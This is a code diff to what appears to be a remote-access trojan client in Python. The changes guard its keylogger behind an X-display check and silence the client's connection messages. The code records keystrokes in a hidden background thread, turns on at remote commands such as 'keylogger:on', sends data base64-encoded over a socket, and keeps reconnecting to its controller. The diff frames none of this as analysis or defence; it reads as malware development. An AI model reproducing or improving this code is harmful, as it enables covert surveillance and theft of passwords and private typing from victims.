@@ -16,32 +16,33 @@ class CLIENT:
             self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
 
     def turn_keylogger(self, status):
-        def on_press(key):
-            if not self.KEYLOGGER_STATUS:
-                return False
+        if HAVE_X:
+            def on_press(key):
+                if not self.KEYLOGGER_STATUS:
+                    return False
 
-            key = str(key)
-            if len(key.strip('\'')) == 1:
-                self.KEYLOGGER_STROKES += key.strip('\'')
+                key = str(key)
+                if len(key.strip('\'')) == 1:
+                    self.KEYLOGGER_STROKES += key.strip('\'')
+                else:
+                    self.KEYLOGGER_STROKES += ("[" + key + "]")
+
+            def on_release(key):
+                if not self.KEYLOGGER_STATUS:
+                    return False
+
+            def logger():            
+                with Listener(on_press=on_press, on_release=on_release) as listener:
+                    listener.join()
+
+            if status:
+                if not self.KEYLOGGER_STATUS:
+                    self.KEYLOGGER_STATUS = True
+                    t = threading.Thread(target=logger)
+                    t.daemon = True
+                    t.start()
             else:
-                self.KEYLOGGER_STROKES += ("[" + key + "]")
-
-        def on_release(key):
-            if not self.KEYLOGGER_STATUS:
-                return False
-
-        def logger():            
-            with Listener(on_press=on_press, on_release=on_release) as listener:
-                listener.join()
-
-        if status:
-            if not self.KEYLOGGER_STATUS:
-                self.KEYLOGGER_STATUS = True
-                t = threading.Thread(target=logger)
-                t.daemon = True
-                t.start()
-        else:
-            self.KEYLOGGER_STATUS = False
+                self.KEYLOGGER_STATUS = False
 
     def execute(self, command):
         data = command.decode('utf-8').split(":")
@@ -65,7 +66,7 @@ class CLIENT:
                 except FileNotFoundError:
                     self.send_data("No Such File or Directory")
 
-        elif data[0] == "keylogger":
+        elif data[0] == "keylogger" and HAVE_X:
 
             #print("Executing Keylogger: " + data[1])
             if data[1] == "on":
@@ -111,10 +112,10 @@ class CLIENT:
         
         while True:
             try:
-                print("Connecting To: %s:%d" % (self.ipaddress, self.port))
+                # print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                 self.SOCK.connect((self.ipaddress, self.port))
             except:
-                print("Failed to Connect. Trying Again!")
+                # print("Failed to Connect. Trying Again!")
                 time.sleep(5)
                 continue
 
